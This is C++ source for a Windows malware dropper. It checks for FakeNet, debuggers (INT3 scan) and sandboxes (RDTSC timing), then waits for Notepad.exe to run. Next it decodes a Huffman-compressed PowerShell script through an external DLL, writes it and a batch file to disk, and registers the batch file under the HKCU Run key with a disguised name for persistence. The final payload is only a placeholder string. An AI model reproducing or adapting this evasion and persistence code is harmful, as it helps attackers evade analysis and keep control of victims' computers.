#include <iostream>
#include <Windows.h>
#include <unordered_map>
#include <string>
#include <memory>
#include <fstream>
#include <vector>
#include <tlhelp32.h>
#include <wininet.h>
#include <tchar.h>
#include <stdint.h>
#include <x86intrin.h>
#include <cpuid.h>
#include <iomanip>


using namespace std;

/*  ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
                                                                                                        Function definitions
    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

uint64_t getRdtsc() {                                                 
  uint32_t low, high;                                                 
  __asm__ volatile ("rdtsc" : "=a" (low), "=d" (high));                
  return ((uint64_t) high << 32) | low;
}

bool CheckSSL(HINTERNET hConnect) {
    char buffer[256];
    DWORD bufferSize = sizeof(buffer);
    BOOL sslCheck = InternetQueryOption(hConnect, INTERNET_OPTION_SECURITY_FLAGS, buffer, &bufferSize);     // Look for security features  
    return sslCheck && (bufferSize > 0);                                                                    // Return TRUE if some data was recieved and the <future> used option is present (SSL)
}

bool CheckContent(const std::string& response) {
    return response.find("<html") != std::string::npos && response.find("<script") != std::string::npos;
}

bool IsConnectedToInternet() {
    HINTERNET hInternet = InternetOpen("CheckConnection", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return false;
    }

    const char* urls[] = {
        "https://www.google.com",
        "https://www.microsoft.com",
        "https://www.apple.com"
    };

    bool result = false;

    for (const char* url : urls) {
        HINTERNET hConnect = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 0);
        if (hConnect) {
            if (CheckSSL(hConnect)) {
                char buffer[4096];
                DWORD bytesRead;
                std::string response;
                while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                    buffer[bytesRead] = '\0';  // Null-terminate the buffer
                    response.append(buffer);
                }
                if (CheckContent(response)) {
                    result = true;
                    break;
                }
            } else {
                ExitProcess(1);
            }
            InternetCloseHandle(hConnect);
        }
    }

    InternetCloseHandle(hInternet);
    return result;
}

/*	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
																				                        compressed PS-code
 	++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

std::string HuffmanStr = "<Huffman Compressed Code>";
struct Node {
    char ch;
    int freq;
    shared_ptr<Node> left, right;
    Node(char c, int f) : ch(c), freq(f), left(nullptr), right(nullptr) {}
    Node(char c, int f, shared_ptr<Node> l, shared_ptr<Node> r) : ch(c), freq(f), left(l), right(r) {}
};

typedef void(*BuildHuffmanTreeFunc)(const string&, unordered_map<char, string>&, shared_ptr<Node>&);
typedef string(*DecodeHuffmanFunc)(const string&, shared_ptr<Node>);
typedef string(*scriptfunc)();
typedef string(*batscriptAfunc)();

int main() {

/*  ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
                                                                                                        detect FakeNet
    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

    if (IsConnectedToInternet()) {
        MessageBox(NULL, "Connected normally", "Safe", MB_OK);
    } else {
        MessageBox(NULL, "FAKENET DETECTED", "DANGER", MB_OK);
        ExitProcess(1);
    }
    
/*  ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
                                                                                                        Anti-debug --> INT 3 check
    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

    int i, j;
    unsigned char* p = reinterpret_cast<unsigned char*>(main);
    for (j = 0; j < 4; j++) {
        std::cout << static_cast<void*>(p) << ": ";
        for (i = 0; i < 16; i++) {
            if (*p == 0xCC) {
                MessageBox(NULL, "Debugger Present", "", MB_OK);
                ExitProcess(1);
            } else {
                std::cout << std::setw(2) << std::setfill('0') << std::hex << static_cast<int>(*p) << " ";
            }
            p++;
        }
        std::cout << std::endl;
    }

/*  ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
                                                                                                            RDTSC check
    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

    unsigned int eax, ebx, ecx, edx;
    int counter = 0;
    for (int i = 0; i < 1000; i++){
        uint64_t rdtsc_value_a = getRdtsc();
        std::cout << "RDTSC value: " << rdtsc_value_a << std::endl;                               
        __cpuid(0, eax, ebx, ecx, edx);
        uint64_t rdtsc_value_b = getRdtsc();
        std::cout << "RDTSC value: " << rdtsc_value_b << std::endl;
        if (rdtsc_value_b - rdtsc_value_a > 500000){
            counter++;
        }
        std::cout << "Iteration " << (i + 1) << ": Counter = " << counter << std::endl;
        }
    if (counter > 5 && counter < 500) {
        MessageBox(NULL, "not a sandbox", "safe", MB_OK);
    } else {
        MessageBox(NULL, "sandbox", "ALERT", MB_OK);
        ExitProcess(1);;
    }

/*  ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
                                                                                            Delay execution until Notepad.exe is working
    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/


    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");

    FARPROC pProcess32First = GetProcAddress(hKernel32, "Process32First");
    typedef BOOL (WINAPI *Process32First_t)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
    Process32First_t pProcess32Firstfun = (Process32First_t)pProcess32First;

    FARPROC pCreateToolhelp32Snapshot = GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
    typedef HANDLE (WINAPI *CreateToolhelp32Snapshot_t)(DWORD dwFlags, DWORD th32ProcessID);
    CreateToolhelp32Snapshot_t pCreateToolhelp32Snapshotfunc = (CreateToolhelp32Snapshot_t)pCreateToolhelp32Snapshot;

    FARPROC pProcess32Next = GetProcAddress(hKernel32, "Process32Next");
    typedef BOOL (WINAPI *Process32Next_t)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
    Process32Next_t pProcess32Nextfunc = Process32Next_t(pProcess32Next);

    const TCHAR* targetProcess = _T("Notepad.exe");

    std::wcout << L"Waiting for " << targetProcess << L" to start...\n";

    while (true) {
        
        bool exists = false;
        PROCESSENTRY32 entry;
        entry.dwSize = sizeof(PROCESSENTRY32);

        HANDLE snapshot = pCreateToolhelp32Snapshotfunc(TH32CS_SNAPPROCESS, NULL);

        if (pProcess32Firstfun(snapshot, &entry)) {
            do {
                if (_tcscmp(entry.szExeFile, targetProcess) == 0) {
                    exists = true;
                    break;
                }
            } while (pProcess32Nextfunc(snapshot, &entry));
        }

        CloseHandle(snapshot);

        if (exists == true) {
            break;
        }
        Beep(1000, 1000); // Check every second 
    }

    std::wcout << targetProcess << L" is now running. Continuing execution...\n";

/*  ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
                                                                                            Generate the batfile and the powershell script
    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/


    HINSTANCE hDLL = LoadLibrary("Big.dll");
  
    BuildHuffmanTreeFunc buildHuffmanTree = (BuildHuffmanTreeFunc)GetProcAddress(hDLL, "buildHuffmanTree");
    DecodeHuffmanFunc decodeHuffman = (DecodeHuffmanFunc)GetProcAddress(hDLL, "decodeHuffman");
    scriptfunc scriptA = (scriptfunc)GetProcAddress(hDLL, "scriptA");
    batscriptAfunc batscriptA = (batscriptAfunc)GetProcAddress(hDLL, "batscriptA");


	std::string script = scriptA();
	std::string batscript = batscriptA();

    if (!buildHuffmanTree || !decodeHuffman) {
        cout << "Could not locate the functions!" << endl;
        return 1;
    }
    
    unordered_map<char, string> huffmanCode;
    shared_ptr<Node> root;
    buildHuffmanTree(script, huffmanCode, root); 

    string decodedStr = decodeHuffman(HuffmanStr, root);
    
    std::ofstream outFile1("PSscriptDecoded.ps1");
    if (outFile1.is_open()){
        outFile1 << decodedStr;
        outFile1.close();
    }

    std::ofstream outFile2("BSdecoded.bat");
    if (outFile2.is_open()){
        outFile2 << batscript;
        outFile2.close();
    }


/*  ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
                                                                                            Inject the batfile into Auto-start registry
    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

    HKEY hkey = NULL;
    const char* exe = "C:\\Users\\path\\to\\BSdecoded.bat";
    long res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS){
        RegSetValueEx(hkey, (LPCSTR)"AphroniaHaimavati", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
        RegCloseKey(hkey);
    }
    FreeLibrary(hDLL);
    return 0;
}

